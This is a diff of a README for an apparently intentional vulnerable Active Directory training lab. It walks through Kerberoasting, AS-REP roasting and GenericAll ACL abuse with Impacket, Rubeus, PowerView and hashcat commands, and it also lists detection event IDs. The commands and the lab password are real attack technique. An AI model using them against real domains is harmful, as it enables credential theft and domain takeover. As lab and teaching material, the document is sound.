@@ -6,7 +6,14 @@
 
 ## Overview
 
-Single Windows Server 2022 domain controller with multiple privilege escalation paths. Initial access via RDP with low-privilege domain credentials.
+Windows Server 2022 domain with a domain-joined workstation. Initial access via RDP to workstation as low-privilege domain user. Multiple privilege escalation paths to Domain Admin.
+
+## Architecture
+
+| Host | Role | Access |
+|------|------|--------|
+| DC (t3.medium) | psychocorp.local domain controller | Domain Admins only |
+| WS01 (t3.small) | Domain-joined workstation | m.johnson (attacker entry) |
 
 ## Attack Paths
 
@@ -14,43 +21,33 @@ Single Windows Server 2022 domain controller with multiple privilege escalation 
 |------|-----------|--------|--------|
 | Kerberoast | TGS cracking | svc_backup | Backup Operators membership |
 | AS-REP Roast | Pre-auth disabled | j.smith | Domain user credentials |
-| ACL Abuse | GenericAll permission | IT Admins group | Domain Admin (via group membership) |
-
-## Architecture
-
-- Windows Server 2022 Domain Controller
-- Domain: psychocorp.local (configurable)
-- RDP access from allowed IPs
-- IMDSv2 optional (not relevant to attack paths)
+| ACL Abuse | GenericAll permission | IT Admins group | Domain Admin |
 
 ## Initial Access
 
-RDP into the DC as `PSYCHOCORP\m.johnson` with the password from outputs.
+RDP to the workstation as `PSYCHOCORP\m.johnson`:
 
 ```bash
 vault outputs ad-privesc --sensitive
-xfreerdp /v:<dc_ip> /u:PSYCHOCORP\\m.johnson /p:<password> /cert:ignore
+xfreerdp /v:<workstation_ip> /u:PSYCHOCORP\\m.johnson /p:<password> /cert:ignore
 ```
 
 ## Attack Walkthrough
 
 ### Path 1: Kerberoast
 
-Enumerate SPNs and request TGS tickets:
+From workstation, enumerate SPNs and request TGS tickets:
 
 ```powershell
-# From attacker machine with domain access
-GetUserSPNs.py psychocorp.local/m.johnson:<password> -dc-ip <dc_ip> -request
+# PowerShell - find accounts with SPNs
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
+    Select-Object SamAccountName, ServicePrincipalName
 ```
 
-Or from the DC:
+Or use Impacket from an attack box:
 
-```powershell
-# Find accounts with SPNs
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-
-# Request TGS (use Rubeus or similar)
-.\Rubeus.exe kerberoast /outfile:hashes.txt
+```bash
+GetUserSPNs.py psychocorp.local/m.johnson:<password> -dc-ip <dc_private_ip> -request
 ```
 
 Crack with hashcat:
@@ -61,20 +58,20 @@ hashcat -m 13100 hashes.txt wordlist.txt
 
 **svc_backup password:** `Summer2024!`
 
-svc_backup is a member of Backup Operators, enabling volume shadow copy abuse for credential extraction.
+svc_backup is a Backup Operator, enabling volume shadow copy abuse for NTDS.dit extraction.
 
 ### Path 2: AS-REP Roast
 
 Find accounts without pre-authentication:
 
 ```powershell
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
 ```
 
 Request AS-REP:
 
 ```bash
-GetNPUsers.py psychocorp.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat
+GetNPUsers.py psychocorp.local/ -usersfile users.txt -dc-ip <dc_private_ip> -format hashcat
 ```
 
 Crack:
@@ -87,55 +84,61 @@ hashcat -m 18200 asrep.txt wordlist.txt
 
 ### Path 3: ACL Abuse
 
-Enumerate ACLs on groups:
+Enumerate ACLs with PowerView or BloodHound:
 
 ```powershell
-# Using PowerView
+# PowerView
 Get-DomainObjectAcl -Identity "IT Admins" -ResolveGUIDs | 
     Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}
 ```
 
 m.johnson has GenericAll on "IT Admins" group. IT Admins is a member of Domain Admins.
 
-Add yourself to the group:
+Exploit:
 
 ```powershell
 Add-ADGroupMember -Identity "IT Admins" -Members m.johnson
-```
 
-Verify Domain Admin access:
-
-```powershell
+# Verify - log off and back on, or use runas
 net user m.johnson /domain
+whoami /groups
 ```
 
 ## Tools
 
-Bring your own tools. Suggested:
+Bring your own. Suggested:
 
+- [Impacket](https://github.com/fortra/impacket) - GetUserSPNs.py, GetNPUsers.py, secretsdump.py
 - [Rubeus](https://github.com/GhostPack/Rubeus) - Kerberos abuse
-- [Impacket](https://github.com/fortra/impacket) - GetUserSPNs.py, GetNPUsers.py
 - [PowerView](https://github.com/PowerShellMafia/PowerSploit) - AD enumeration
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Attack path visualization
 - [Hashcat](https://hashcat.net/hashcat/) - Hash cracking
 
 ## Detection Opportunities
 
-| Attack | Event ID | Detection |
+| Attack | Event ID | Indicator |
 |--------|----------|-----------|
-| Kerberoast | 4769 | TGS requests with RC4 encryption |
-| AS-REP Roast | 4768 | Pre-auth failures from unusual sources |
-| ACL Abuse | 4728, 5136 | Group membership changes, ACL modifications |
+| Kerberoast | 4769 | TGS requests for service accounts with RC4 |
+| AS-REP Roast | 4768 | Pre-auth failures, AS-REQ without pre-auth |
+| ACL Abuse | 4728, 5136 | Group membership changes |
+| DCSync | 4662 | Replication requests from non-DC |
+
+## Troubleshooting
+
+**Workstation not domain-joined:**
+- Check `C:\ws-setup.log` on workstation
+- Verify DC is responding: `Test-NetConnection <dc_private_ip> -Port 389`
+
+**Users not created:**
+- Check `C:\ad-configure.log` on DC
+- Verify AD services: `Get-Service ADWS,DNS,Netlogon`
+
+**RDP fails to workstation:**
+- Ensure security group allows your IP
+- Verify domain join completed (check log)
 
 ## Cleanup
 
 ```bash
 vault destroy ad-privesc
 ```
-
-## Notes
-
-- Allow 10-15 minutes after deployment for AD DS installation
-- Check `C:\ad-setup.log` and `C:\ad-configure.log` for setup status
-- Windows licensing: uses AWS-provided evaluation license
-- Cost: ~$0.05-0.10/hour for t3.medium Windows instance
